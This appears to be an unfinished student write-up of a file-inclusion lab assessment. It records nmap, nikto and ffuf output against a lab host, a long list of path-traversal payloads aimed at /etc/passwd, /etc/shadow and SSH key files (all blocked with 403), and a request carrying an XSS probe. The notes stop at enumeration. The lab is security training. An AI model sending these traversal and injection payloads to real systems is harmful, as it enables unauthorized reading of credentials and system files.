### Skills Assessment - File Inclusion
#### Scenario
The company INLANEFREIGHT has contracted you to perform a web application assessment against one of their public-facing websites. They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application checking for file inclusion and path traversal vulnerabilities.

Find the vulnerabilities and submit a final flag using the skills we covered in the module sections to complete this module.

Don't forget to think outside the box!

Target -->> Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. 
            Submit the contents of the flag as your answer.

#### Recon
##### Enumeration

* Target -- 94.237.62.195


#### NMAP - Network Enumeration
```
nmap -sC -sV -p- -Pn 94.237.62.195 -oN nmap/94.237.62.195.nmap -T4 -v

Discovered open port 54509/tcp on 94.237.62.195
PORT      STATE SERVICE VERSION
54509/tcp open  http    nginx 1.18.0
|_http-title: InlaneFreight
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0

Discovered open port 8080/tcp on 94.237.62.195
PORT     STATE    SERVICE    VERSION
8080/tcp filtered http-proxy

Discovered open port 25/tcp on 94.237.62.195
PORT   STATE SERVICE VERSION
25/tcp open  smtp?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, Hello, Help, NULL, RTSPRequest: 
|     554-as8758.net SMTPBLOCKER ESMTP Service not available
|     554-No SMTP service
|     554-Sending on port 25 not allowed, use port 587
|_    clarification visit https://wiki.iway.ch/kb/wiki/Internet_Access/Sperrung_Port_25_(SMTP)
|_smtp-commands: SMTP EHLO 94-237-62-195.uk-lon1.upcloud.host: failed to receive data: connection closed
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Discovered open port 22/tcp on 94.237.62.195
Discovered open port 52269/tcp on 94.237.62.195
PORT      STATE    SERVICE VERSION
52269/tcp filtered unknown

Discovered open port 46104/tcp on 94.237.62.195
Discovered open port 46452/tcp on 94.237.62.195
Discovered open port 59007/tcp on 94.237.62.195
Discovered open port 37675/tcp on 94.237.62.195
Discovered open port 45305/tcp on 94.237.62.195
Discovered open port 59492/tcp on 94.237.62.195
Discovered open port 30074/tcp on 94.237.62.195
Discovered open port 40526/tcp on 94.237.62.195
Discovered open port 48359/tcp on 94.237.62.195
Discovered open port 33071/tcp on 94.237.62.195
Discovered open port 32676/tcp on 94.237.62.195
Discovered open port 42781/tcp on 94.237.62.195
Discovered open port 50085/tcp on 94.237.62.195
Discovered open port 38712/tcp on 94.237.62.195
Discovered open port 38393/tcp on 94.237.62.195
Discovered open port 48911/tcp on 94.237.62.195
Discovered open port 33677/tcp on 94.237.62.195
Discovered open port 38517/tcp on 94.237.62.195
Discovered open port 55177/tcp on 94.237.62.195
Discovered open port 35641/tcp on 94.237.62.195
Discovered open port 51427/tcp on 94.237.62.195
Discovered open port 39106/tcp on 94.237.62.195
Discovered open port 51868/tcp on 94.237.62.195
Discovered open port 31075/tcp on 94.237.62.195
Discovered open port 32054/tcp on 94.237.62.195
Discovered open port 55074/tcp on 94.237.62.195
Discovered open port 35070/tcp on 94.237.62.195

```


#### Nikto

```
└──╼ [★]# nikto -C All -h http://94.237.62.195:54509
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          94.237.62.195
+ Target Hostname:    94-237-62-195.uk-lon1.upcloud.host
+ Target Port:        54509
+ Start Time:         2024-04-25 17:55:41 (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ Retrieved x-powered-by header: PHP/7.3.22
+ The anti-clickjacking X-Frame-Options header is not present.
+ RFC-1918 IP address found in the 'location' header. The IP is "192.168.14.124".
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://192.168.14.124:8080/images/".
+ /ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C: This check (A) sets up the next bad blue test (B) for possible exploit. See http://www.badblue.com/down.htm
+ OSVDB-3233: /doc/rt/overview-summary.html: Oracle Business Components for Java 3.1 docs is running.
+ OSVDB-724: /ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.  http://ans.gq.nu/ default admin string 'admin:aaLR8vE.jjhss:root@127.0.0.1', password file location 'ans_data/ans.passwd'
+ OSVDB-724: /ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
+ 6544 items checked: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2024-04-25 17:59:58 (GMT1) (257 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

#### Manual Site Enumeration

```
http://94.237.62.195:54509/index.php?page=about - About
http://94.237.62.195:54509/index.php - Home
http://94.237.62.195:54509/index.php?page=industries - industries
http://94.237.62.195:54509/index.php?page=contact - Contact
http://94.237.62.195:54509/booking.html - Booking
http://94.237.62.195:54509/search.php - 404 Not Found
```

#### Auto Site Enumeration

```
└──╼ [★]# ffuf -w /opt/repos/SecLists/Discovery/Web-Content/raft-small-directories.txt:FKK -u 'http://94.237.62.195:54509/FKK.php'
contact                 [Status: 200, Size: 2714, Words: 773, Lines: 78, Duration: 37ms]
error                   [Status: 200, Size: 199, Words: 41, Lines: 10, Duration: 24ms]
about                   [Status: 200, Size: 10313, Words: 2398, Lines: 214, Duration: 35ms]
index                   [Status: 200, Size: 15829, Words: 3435, Lines: 401, Duration: 43ms]
main                    [Status: 200, Size: 11507, Words: 2639, Lines: 284, Duration: 26ms]
industries              [Status: 200, Size: 8082, Words: 2018, Lines: 197, Duration: 24ms]
:: Progress: [20116/20116] :: Job [1/1] :: 851 req/sec :: Duration: [0:00:14] :: Errors: 0 ::

```
```
──╼ [★]# ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.62.195:54509/error.php=FUZZ' -fs 15829

/.../.../.../.../.../   [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]
/.bash_history          [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 31ms]
/..\../..\../..\../..\../..\../..\../boot.ini [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 29ms]
/.bash_profile          [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 36ms]
/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]
..\../..\../boot.ini    [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 43ms]
/.bashrc                [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 42ms]
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 38ms]
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 39ms]
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 39ms]
..\../..\../..\../..\../boot.ini [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 47ms]
/.cshrc                 [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 48ms]
/..\../..\../..\../..\../..\../..\../etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 23ms]
.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 24ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 34ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 37ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 37ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 38ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 40ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 40ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 40ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 40ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 40ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 40ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 40ms]
....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 40ms]
....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 26ms]
....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 29ms]
....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 29ms]
....\/....\/etc/passwd  [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 29ms]
....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 31ms]
....\/....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 31ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 31ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 31ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 29ms]
....\/....\/....\/....\/etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 32ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 33ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 33ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 33ms]
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 32ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 32ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 33ms]
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 36ms]
....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 34ms]
....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 34ms]
....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]
....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]
....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]
....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 36ms]
....//....//etc/passwd  [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 38ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 40ms]
....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 38ms]
....//....//....//....//....//....//....//....//etc/passwd [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 43ms]
/..\../..\../..\../..\../..\../..\../etc/shadow [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 39ms]
.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 39ms]
../.htpasswd            [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 25ms]
/.forward               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 44ms]
/.htpasswd              [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 44ms]
/.logout                [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 26ms]
/.netrc                 [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 21ms]
members/.htpasswd       [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 22ms]
member/.htpasswd        [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 24ms]
../.pass                [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 34ms]
/.passwd                [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]
../.passwd              [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]
/.profile               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 64ms]
root/.htpasswd          [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 37ms]
/.sh_history            [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 37ms]
/root/.ksh_history      [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 38ms]
/root/.Xauthority       [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 37ms]
/root/.bash_logut       [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 38ms]
/.rhosts                [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 39ms]
/root/.bash_history     [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 39ms]
user/.htpasswd          [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 20ms]
/.shosts                [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 21ms]
/.ssh/authorized_keys   [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 24ms]
users/.htpasswd         [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 21ms]
/var/www/html/.htaccess [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 34ms]
/var/www/localhost/htdocs/.htaccess [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 34ms]
/var/www/vhosts/sitename/httpdocs/.htaccess [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 29ms]
/var/www/web1/html/.htaccess [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 53ms]
/..\..\..\..\..\..\winnt\win.ini [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 26ms]
/.Xauthority            [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 23ms]
:: Progress: [922/922] :: Job [1/1] :: 600 req/sec :: Duration: [0:00:01] :: Errors: 3 ::
```
#### Enumeration
```
└──╼ [★]# ffuf -w /opt/repos/SecLists/Discovery/Web-Content/raft-large-directories.txt:FKK -u 'http://94.237.62.195:54509/FKK' -fs 15829

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://94.237.62.195:54509/FKK
 :: Wordlist         : FKK: /opt/repos/SecLists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15829
________________________________________________

images                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 36ms]
js                      [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 48ms]
css                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 53ms]
fonts                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 24ms]

```

##### Notes
* The webserver is on 54509 and seems to redirect to 8080 so seems nginx sservice an app on 8080 using proxy rewrite to 54509
* interesting directories found so far:

```
images                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 36ms]
js                      [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 48ms]
css                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 53ms]
fonts                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 24ms]
```
* Interesting Vulknerabilities found on nginx version whioch seems exploitable
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
* https://github.com/detectify/vulnerable-nginx



#### Requests 

* Interesting request which seems to allow parameter manipualtion
```
GET /index.php?message=%3Cscipt%3Ealert(1);%20/%3E HTTP/1.1
Host: 94.237.62.195:54509
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```
